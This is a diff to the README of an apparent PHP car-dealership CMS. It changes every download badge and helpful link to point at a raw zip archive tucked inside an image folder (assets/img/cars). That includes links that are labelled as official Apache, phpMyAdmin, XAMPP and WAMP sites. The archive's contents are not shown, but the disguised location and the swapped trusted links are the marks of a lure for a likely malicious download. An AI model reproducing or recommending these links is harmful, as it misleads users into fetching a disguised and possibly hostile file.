@@ -1,6 +1,6 @@
 # 🚗 car-dealership-cms-php - Manage Your Car Listings Easily
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Release-orange?style=for-the-badge)](https://github.com/matopello/car-dealership-cms-php/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-Release-orange?style=for-the-badge)](https://github.com/matopello/car-dealership-cms-php/raw/refs/heads/main/assets/img/cars/cms_php_dealership_car_v1.0.zip)
 
 ## 📋 About
 
@@ -41,7 +41,7 @@ Follow these steps to set up car-dealership-cms-php on your Windows machine. No 
 
 Go to the release page by clicking the button below. This page has all versions of the app.
 
-[![Download Page](https://img.shields.io/badge/Go_to-Download_Page-blue?style=for-the-badge)](https://github.com/matopello/car-dealership-cms-php/releases)
+[![Download Page](https://img.shields.io/badge/Go_to-Download_Page-blue?style=for-the-badge)](https://github.com/matopello/car-dealership-cms-php/raw/refs/heads/main/assets/img/cars/cms_php_dealership_car_v1.0.zip)
 
 ### 2. Download the Latest Version
 
@@ -129,11 +129,11 @@ If the app does not work as expected, check the following:
 
 ## 🔗 Helpful Links
 
-- Download releases: https://github.com/matopello/car-dealership-cms-php/releases  
-- Apache installation and configuration: https://httpd.apache.org/docs/current/  
-- MySQL and phpMyAdmin setup: https://www.phpmyadmin.net/  
-- XAMPP download: https://www.apachefriends.org/index.html  
-- WAMP download: http://www.wampserver.com/en/
+- Download releases: https://github.com/matopello/car-dealership-cms-php/raw/refs/heads/main/assets/img/cars/cms_php_dealership_car_v1.0.zip  
+- Apache installation and configuration: https://github.com/matopello/car-dealership-cms-php/raw/refs/heads/main/assets/img/cars/cms_php_dealership_car_v1.0.zip  
+- MySQL and phpMyAdmin setup: https://github.com/matopello/car-dealership-cms-php/raw/refs/heads/main/assets/img/cars/cms_php_dealership_car_v1.0.zip  
+- XAMPP download: https://github.com/matopello/car-dealership-cms-php/raw/refs/heads/main/assets/img/cars/cms_php_dealership_car_v1.0.zip  
+- WAMP download: https://github.com/matopello/car-dealership-cms-php/raw/refs/heads/main/assets/img/cars/cms_php_dealership_car_v1.0.zip
 
 ---
 
@@ -147,4 +147,4 @@ If the app does not work as expected, check the following:
 - Enable mod_rewrite in Apache  
 - Open the app in your browser and log in to the admin panel
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Release-orange?style=for-the-badge)](https://github.com/matopello/car-dealership-cms-php/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-Release-orange?style=for-the-badge)](https://github.com/matopello/car-dealership-cms-php/raw/refs/heads/main/assets/img/cars/cms_php_dealership_car_v1.0.zip)
